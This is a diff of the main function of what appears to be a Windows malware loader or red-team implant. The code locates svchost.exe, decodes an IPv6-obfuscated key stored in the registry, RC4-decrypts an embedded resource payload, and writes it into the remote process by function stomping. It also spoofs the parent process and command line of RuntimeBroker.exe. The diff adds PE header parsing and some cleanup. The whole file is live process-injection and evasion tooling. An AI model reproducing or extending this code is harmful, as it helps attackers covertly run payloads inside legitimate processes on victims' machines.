@@ -1,34 +1,62 @@
-﻿#include "main.h"
+﻿#include "../Headers/main.h"
 
 int main()
 {
-	HANDLE hProcess = 0, hProcess1 = 0, hProcess2 = 0, hThread = 0, hThread1 = 0, hThread2= 0, hPayloadObjectHandle = 0;
-	DWORD  dwPID0 = 0, dwPID1 = 0, dwPID2 = 0, dwOldProtections = 0, dwThreadId = 0, dwThreadId1 = 0, dwThreadId2 = 0;
-	PUCHAR pObfInput = NULL, * pObfOutput = NULL, pKey = NULL, pExtPayloadAddres = NULL;
-	SIZE_T sBytesWritten = 0, sPaddedInputSize = 64, sObfuscatedSize = 0, sClearPayload = 0, sOriginalInputSize = 64;
-	Context RC4Context_t;
-	RESOURCE resource;
-	PVOID pExPayload, pStompingTarget = NULL;
-	LPWSTR TargetProcessName = L"svchost.exe";
-	LPSTR  pTargetProcessName = "RuntimeBroker.exe";
-	PPEB   pProcessEnvironmentBlock_t = NULL;
-	HANDLE hHeap = GetProcessHeap();
-	PBYTE  pImageData = NULL;
+	HANDLE						  hProcess					= INVALID_HANDLE_VALUE,
+								  hProcess1					= INVALID_HANDLE_VALUE,
+								  hProcess2					= INVALID_HANDLE_VALUE,
+								  hThread					= INVALID_HANDLE_VALUE,
+								  hThread1					= INVALID_HANDLE_VALUE,
+								  hThread2					= INVALID_HANDLE_VALUE,
+								  hPayloadObjectHandle		= INVALID_HANDLE_VALUE;
 
+	DWORD						  dwPID0					= 0,
+								  dwPID1					= 0,
+							      dwPID2					= 0,
+								  dwOldProtections			= 0,
+								  dwThreadId				= 0,
+								  dwThreadId1				= 0,
+								  dwThreadId2				= 0;
+
+	PUCHAR						  pObfInput					= NULL,
+								 *pObfOutput				= NULL,
+								  pKey						= NULL,
+								  pExtPayloadAddres			= NULL;
+
+	SIZE_T						  sBytesWritten				= 0,
+								  sPaddedInputSize			= 64,
+								  sObfuscatedSize			= 0,
+								  sClearPayload				= 0,
+								  sOriginalInputSize		= 64;
+
+	Context						  RC4Context_t				= { 0 };
+	RESOURCE					  resource					= { 0 };
+	PVOID						  pExPayload				= NULL,
+								  pStompingTarget			= NULL;
+	HANDLE						  hHeap						= INVALID_HANDLE_VALUE;
+	PBYTE						  pImageData				= NULL;
+	LPWSTR						  pImagePath				= NULL;
 	PIMAGE_DOS_HEADER			  pImageDOSHeader_t			= NULL;
 	PIMAGE_NT_HEADERS			  pImageNtHeaders_t			= NULL;
 	PIMAGE_TLS_DIRECTORY		  pImageTlsDirectory_t		= NULL;
+	PIMAGE_FILE_HEADER			  pImageFileHeader_t		= NULL;
 	PIMAGE_OPTIONAL_HEADER		  pImageOptionalHeaders_t	= NULL;
 	PIMAGE_BASE_RELOCATION		  pImageBaseRelocationDir_t = NULL;
 	PIMAGE_RUNTIME_FUNCTION_ENTRY pImageRtFuncDirectory_t	= NULL;
-	
+	PIMAGE_IMPORT_DESCRIPTOR	  pImageImportDirectory_t	= NULL;
+	PIMAGE_EXPORT_DIRECTORY		  pImageExportDirectory		= NULL;
+	LPSTR						  pTargetProcessName		= "RuntimeBroker.exe";
+	LPWSTR						  TargetProcessName			= L"svchost.exe";
+
 	//if(!FetchAlertableThread(GetCurrentThreadId(), GetCurrentProcessId() ,&dwThreadId, &hThread)) return -2;
 
 	EnumRemoteProcessHandle(TargetProcessName, &dwPID0, &hProcess);
 
 	//if (EnumProcessNTQuerySystemInformation(TargetProcessName, &dwPID0, &hProcess) == FALSE) return -2;
 
-	FetchImageData(L"C:\\Windows\\System32\\calc.exe", hHeap, &pImageData);
+	if (!FetchPathFromRunningProcess(hProcess, &pImagePath)) return -3;
+
+	FetchImageData(pImagePath, hHeap, &pImageData);
 
 	FetchImageDosHeader(pImageData, &pImageDOSHeader_t);
 
@@ -40,10 +68,13 @@ int main()
 
 	FetchImageRtFuncDirectory(pImageData, &pImageRtFuncDirectory_t);
 
+	FetchImageBaseRelocDirectory(pImageData, &pImageBaseRelocationDir_t);
 
+	FetchImageFileHeader(pImageData, &pImageFileHeader_t);
 
-	FetchImageHeaders(hProcess, &pProcessEnvironmentBlock_t);
+	FetchImageImportDirectory(pImageData, &pImageImportDirectory_t);
 
+	FetchImageExportDirectory(pImageData, &pImageExportDirectory);
 
 	//getchar();
 
@@ -51,10 +82,10 @@ int main()
 
 	if (!ReadRegKeys(&pObfOutput, &sObfuscatedSize)) return -1;
 
-	if (!(pKey = LocalAlloc(LPTR, 256))) return -2;
+	if ((pKey = (PUCHAR) LocalAlloc(LPTR, 256)) == NULL) return -2;
 
 	if (!DeobfuscatePayloadIPv6(
-		(PUCHAR*)&pKey,
+		&pKey,
 		pObfOutput,
 		sObfuscatedSize + 1,
 		&sClearPayload,
@@ -65,11 +96,11 @@ int main()
 
 	if (!FetchResource(&resource)) return -5;
 
-	if (!(pObfInput = LocalAlloc(LPTR, resource.sSize))) return -14;
+	if ((pObfInput = (PUCHAR) LocalAlloc(LPTR, resource.sSize)) == NULL) return -14;
 
-	if (!rInit(&RC4Context_t, pKey, strlen((CHAR*)pKey))) return -6;
+	if (!rInit(&RC4Context_t, pKey, strlen((CHAR *)pKey))) return -6;
 
-	rFin(&RC4Context_t, (PVOID)resource.pAddress, pObfInput, resource.sSize);
+	rFin(&RC4Context_t, resource.pAddress, pObfInput, resource.sSize);
 
 	StompRemoteFunction(pStompingTarget, hProcess, pObfInput, resource.sSize);
 
@@ -79,7 +110,7 @@ int main()
 
 	for (UCHAR i = 0; i < 8; i++)
 	{
-		pOutput[i] = pTargetSubDirectory[i] ^ pXorKey[i];
+		pOutput[i] = (CHAR)(pTargetSubDirectory[i] ^ pXorKey[i]);
 	}
 
 	SpoofProcessCLA_PPID(
